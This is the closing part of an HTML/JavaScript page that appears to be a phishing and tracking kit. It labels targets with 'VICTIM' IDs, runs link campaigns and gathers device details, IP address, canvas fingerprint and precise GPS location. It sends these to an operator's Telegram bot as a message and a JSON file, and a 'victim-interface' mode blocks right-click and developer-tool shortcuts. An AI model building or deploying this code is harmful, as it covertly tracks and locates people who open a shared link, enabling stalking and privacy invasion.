            if (!navigator.cookieEnabled) {
                securityIssues.push('Cookies disabled');
            }
            
            if (navigator.doNotTrack === '1') {
                securityIssues.push('Do Not Track enabled');
            }
            
            if (securityIssues.length > 0) {
                showToast(`Security issues found: ${securityIssues.join(', ')}`, 'warning');
            } else {
                showToast('No major security issues detected', 'success');
            }
        }
        
        function compressData() {
            showToast('Data compression feature would compress the collected data here.', 'info');
        }
        
        function testKeyboard() {
            showToast('Keyboard tester opened in new window', 'info');
        }
        
        function testAudio() {
            showToast('Audio tester requires microphone permission', 'info');
            
            navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                showToast('Microphone access granted! Audio test passed.', 'success');
                stream.getTracks().forEach(track => track.stop());
            }).catch(err => {
                showToast('Microphone access denied or not available', 'error');
            });
        }
        
        function shareLink(platform) {
            const preview = document.getElementById('generated-link-preview');
            const codeElement = preview?.querySelector('code');
            
            if (!codeElement) {
                showToast('Generate a link first', 'error');
                return;
            }
            
            const link = codeElement.textContent;
            let url = '';
            
            switch(platform) {
                case 'facebook':
                    url = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}`;
                    break;
                case 'whatsapp':
                    url = `https://wa.me/?text=${encodeURIComponent(`Check this out: ${link}`)}`;
                    break;
                case 'telegram':
                    url = `https://t.me/share/url?url=${encodeURIComponent(link)}`;
                    break;
                case 'twitter':
                    url = `https://twitter.com/intent/tweet?url=${encodeURIComponent(link)}`;
                    break;
                case 'messenger':
                    url = `fb-messenger://share?link=${encodeURIComponent(link)}`;
                    break;
            }
            
            if (url) {
                window.open(url, '_blank');
                showToast(`Sharing on ${platform}`, 'info');
            }
        }
        
        function openTelegramModal() {
            const modal = new bootstrap.Modal(document.getElementById('telegramModal'));
            modal.show();
        }
        
        async function sendDashboardDataToTelegram() {
            try {
                const botToken = document.getElementById('modal-bot-token')?.value || telegramConfig.botToken;
                const chatId = document.getElementById('modal-chat-id')?.value || telegramConfig.chatId;
                
                if (!botToken || !chatId) {
                    showToast('Please configure bot token and chat ID', 'error');
                    return;
                }
                
                telegramConfig.botToken = botToken;
                telegramConfig.chatId = chatId;
                
                await collectDashboardData();
                
                const message = formatDashboardTelegramMessage();
                
                await sendTelegramMessage(message);
                
                const jsonData = JSON.stringify(deviceData, null, 2);
                await sendTelegramDocument(
                    new Blob([jsonData], { type: 'application/json' }),
                    `device-data-${Date.now()}.json`,
                    'Complete device information data'
                );
                
                showToast('Data sent to Telegram successfully', 'success');
                
                const modal = bootstrap.Modal.getInstance(document.querySelector('#telegramModal'));
                if (modal) modal.hide();
                
            } catch (error) {
                console.error('Failed to send data:', error);
                showToast(`Failed to send: ${error.message}`, 'error');
            }
        }
        
        async function collectDashboardData() {
            await refreshDeviceInfo();
            await refreshNetworkInfo();
            
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    deviceData.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                } catch (error) {}
            }
            
            generateFingerprint();
        }
        
        function formatDashboardTelegramMessage() {
            let message = `📱 *DEVICE INFORMATION REPORT*\n\n`;
            message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
            message += `🆔 *ID:* ${deviceData.victimID || 'Not generated'}\n\n`;
            
            if (deviceData.deviceInfo) {
                message += `📊 *Device Information:*\n`;
                message += `• Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `• Device: ${getDeviceName()}\n`;
                message += `• Resolution: ${window.screen.width} x ${window.screen.height}\n`;
                message += `• User Agent: \`${navigator.userAgent.substring(0, 50)}...\`\n\n`;
            }
            
            if (deviceData.networkInfo?.ipv4) {
                message += `🌐 *Network Information:*\n`;
                message += `• IP: \`${deviceData.networkInfo.ipv4}\`\n`;
                message += `• Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                message += `• Status: ${deviceData.networkInfo.onlineStatus || 'Unknown'}\n\n`;
            }
            
            if (deviceData.locationInfo?.latitude) {
                message += `📍 *Location:*\n`;
                message += `• Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
                message += `• Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                message += `• Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
                message += `• Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n\n`;
            }
            
            if (deviceData.fingerprintInfo?.canvas) {
                message += `🆔 *Fingerprint:*\n`;
                message += `• Hash: \`${deviceData.fingerprintInfo.canvas.substring(0, 32)}...\`\n`;
                message += `• Timezone: ${deviceData.fingerprintInfo.timezone || 'Unknown'}\n\n`;
            }
            
            message += `_Report generated by Device Information Scanner_`;
            
            return message;
        }
        
        async function sendTelegramDocument(blob, filename, caption = '') {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                throw new Error('Telegram configuration missing');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendDocument`;
            
            const formData = new FormData();
            formData.append('chat_id', telegramConfig.chatId);
            formData.append('document', blob, filename);
            
            if (caption) {
                formData.append('caption', caption);
            }
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Telegram API error');
            }
            
            return data;
        }

        // ============================================
        // UTILITY FUNCTIONS
        // ============================================
        
        function generateVictimID() {
            const timestamp = Date.now();
            const randomStr = Math.random().toString(36).substring(2, 10);
            const userAgentHash = simpleHash(navigator.userAgent).substring(0, 8);
            const victimID = `VICTIM-${timestamp.toString(36).substring(4)}-${randomStr}-${userAgentHash}`;
            
            deviceData.victimID = victimID;
            
            const victimIdElement = document.getElementById('victim-id-display');
            if (victimIdElement) {
                victimIdElement.textContent = victimID;
            }
            
            return victimID;
        }
        
        function generateNewVictimID() {
            const newId = generateVictimID();
            document.getElementById('victim-id-display').textContent = newId;
            deviceData.victimID = newId;
            
            const qrContainer = document.getElementById('qr-code-display');
            qrContainer.innerHTML = '';
            QRCode.toCanvas(newId, { width: 150, height: 150 }, function(error, canvas) {
                if (error) {
                    qrContainer.innerHTML = '<span>QR code failed</span>';
                } else {
                    qrContainer.appendChild(canvas);
                }
            });
            
            showToast('New Victim ID generated', 'success');
        }
        
        function getDeviceName() {
            const userAgent = navigator.userAgent.toLowerCase();
            
            if (userAgent.includes('iphone')) return 'iPhone';
            if (userAgent.includes('ipad')) return 'iPad';
            if (userAgent.includes('android')) return 'Android Device';
            if (userAgent.includes('windows')) return 'Windows PC';
            if (userAgent.includes('mac')) return 'Mac';
            if (userAgent.includes('linux')) return 'Linux PC';
            
            return 'Unknown Device';
        }
        
        function refreshDeviceInfo() {
            document.getElementById('platform-info').textContent = navigator.platform || 'Unknown';
            document.getElementById('user-agent').textContent = navigator.userAgent;
            document.getElementById('device-name').textContent = getDeviceName();
            
            if (navigator.deviceMemory) {
                document.getElementById('device-memory').textContent = `${navigator.deviceMemory} GB`;
            } else {
                document.getElementById('device-memory').textContent = 'Not available';
            }
            
            document.getElementById('screen-resolution').textContent = `${window.screen.width} x ${window.screen.height}`;
            document.getElementById('color-depth').textContent = `${window.screen.colorDepth} bit`;
            document.getElementById('pixel-ratio').textContent = window.devicePixelRatio || 1;
            document.getElementById('orientation').textContent = window.screen.width > window.screen.height ? 'Landscape' : 'Portrait';
            
            showToast('Device information refreshed', 'success');
        }
        
        async function refreshNetworkInfo() {
            document.getElementById('online-status').textContent = navigator.onLine ? 'Online' : 'Offline';
            
            if (navigator.connection) {
                const connection = navigator.connection;
                document.getElementById('connection-type').textContent = connection.effectiveType || 'Unknown';
                document.getElementById('network-rtt').textContent = `${connection.rtt || 'Unknown'} ms`;
                document.getElementById('data-saver').textContent = connection.saveData ? 'Enabled' : 'Disabled';
                
                if (connection.downlink) {
                    document.getElementById('network-bandwidth').textContent = `${connection.downlink} Mbps`;
                }
            } else {
                document.getElementById('connection-type').textContent = 'Not available';
                document.getElementById('network-rtt').textContent = 'Not available';
                document.getElementById('data-saver').textContent = 'Not available';
                document.getElementById('network-bandwidth').textContent = 'Not available';
            }
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                document.getElementById('ipv4-address').textContent = data.ip;
            } catch (error) {
                document.getElementById('ipv4-address').textContent = 'Unable to retrieve';
            }
            
            showToast('Network information refreshed', 'success');
        }
        
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(36);
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function showToast(message, type = 'info') {
            const existingToasts = document.querySelectorAll('.custom-toast');
            existingToasts.forEach(toast => toast.remove());
            
            const toast = document.createElement('div');
            toast.className = 'custom-toast';
            
            let bgColor = 'bg-primary';
            let icon = 'fas fa-info-circle';
            
            if (type === 'success') {
                bgColor = 'bg-success';
                icon = 'fas fa-check-circle';
            } else if (type === 'error') {
                bgColor = 'bg-danger';
                icon = 'fas fa-exclamation-circle';
            } else if (type === 'warning') {
                bgColor = 'bg-warning';
                icon = 'fas fa-exclamation-triangle';
            }
            
            toast.innerHTML = `
                <div class="toast show" role="alert">
                    <div class="toast-header ${bgColor} text-white">
                        <i class="${icon} me-2"></i>
                        <strong class="me-auto">Device Scanner</strong>
                        <button type="button" class="btn-close btn-close-white" onclick="this.parentElement.parentElement.parentElement.remove()"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.remove();
                }
            }, 5000);
        }
        
        function copyToClipboard(text) {
            if (typeof text === 'string') {
                navigator.clipboard.writeText(text).then(() => {
                    showToast('Copied to clipboard!', 'success');
                }).catch(err => {
                    const textarea = document.createElement('textarea');
                    textarea.value = text;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    showToast('Copied to clipboard!', 'success');
                });
            } else if (text === 'clipboard-content') {
                const textarea = document.getElementById('clipboard-content');
                textarea.select();
                document.execCommand('copy');
                showToast('Copied to clipboard!', 'success');
            }
        }
        
        function downloadData() {
            deviceData.timestamp = new Date().toISOString();
            
            const dataStr = JSON.stringify(deviceData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            const downloadLink = document.createElement('a');
            downloadLink.href = URL.createObjectURL(dataBlob);
            downloadLink.download = `device-data-${new Date().toISOString().split('T')[0]}.json`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            showToast('Data downloaded successfully!', 'success');
        }
        
        function clearAllData() {
            if (confirm('Are you sure you want to clear all collected data? This cannot be undone.')) {
                Object.keys(deviceData).forEach(key => {
                    if (typeof deviceData[key] === 'object') {
                        deviceData[key] = {};
                    }
                });
                
                campaignManager.campaigns = [];
                campaignManager.saveToStorage();
                
                telegramConfig.sendHistory = [];
                campaignManager.saveToStorage();
                
                const screenshotsContainer = document.getElementById('screenshots-preview');
                if (screenshotsContainer) screenshotsContainer.innerHTML = '';
                
                const clipboardContent = document.getElementById('clipboard-content');
                if (clipboardContent) clipboardContent.value = '';
                
                campaignManager.updateUI();
                updateTelegramHistory();
                
                showToast('All data cleared successfully!', 'success');
            }
        }
        
        function deleteCampaign(campaignId) {
            if (confirm('Are you sure you want to delete this campaign? This cannot be undone.')) {
                campaignManager.campaigns = campaignManager.campaigns.filter(c => c.id !== campaignId);
                campaignManager.saveToStorage();
                campaignManager.updateUI();
                showToast('Campaign deleted successfully!', 'success');
            }
        }
        
        function collectAllData() {
            showToast('Collecting all device data...', 'info');
            
            Promise.all([
                collectBasicDeviceInfo(),
                collectMobileCapabilities(),
                collectNetworkInfo(),
                collectFingerprintInfo(),
                collectPermissionsInfo(),
                collectBatteryInfo(),
                collectStorageInfo()
            ]).then(() => {
                showToast('All data collected successfully!', 'success');
            }).catch(error => {
                showToast(`Error collecting data: ${error.message}`, 'error');
            });
        }
        
        function startSensorMonitoring() {
            // Sensor monitoring implementation
        }
        
        function viewCampaignDetails(campaignId) {
            const campaign = campaignManager.getCampaign(campaignId);
            if (campaign) {
                alert(`Campaign Details:\n\nName: ${campaign.name}\nLink: ${campaign.link}\nClicks: ${campaign.stats.clicks}\nData Collected: ${campaign.stats.dataCollected}\nLast Access: ${campaign.stats.lastAccess ? new Date(campaign.stats.lastAccess).toLocaleString() : 'Never'}`);
            }
        }
        
        function initializeDataCollection() {
            collectAllData();
        }

        // ============================================
        // SECURITY ENHANCEMENTS
        // ============================================
        
        document.addEventListener('contextmenu', function(e) {
            if (document.body.classList.contains('victim-interface')) {
                e.preventDefault();
                return false;
            }
        });
        
        document.addEventListener('keydown', function(e) {
            if (document.body.classList.contains('victim-interface')) {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                    return false;
                }
            }
        });
        
        (function() {
            const startTime = new Date();
            function checkDebugger() {
                if (new Date() - startTime > 100) {
                    console.log('Debugger detected');
                }
            }
            setInterval(checkDebugger, 100);
        })();
    </script>
</body>
</html>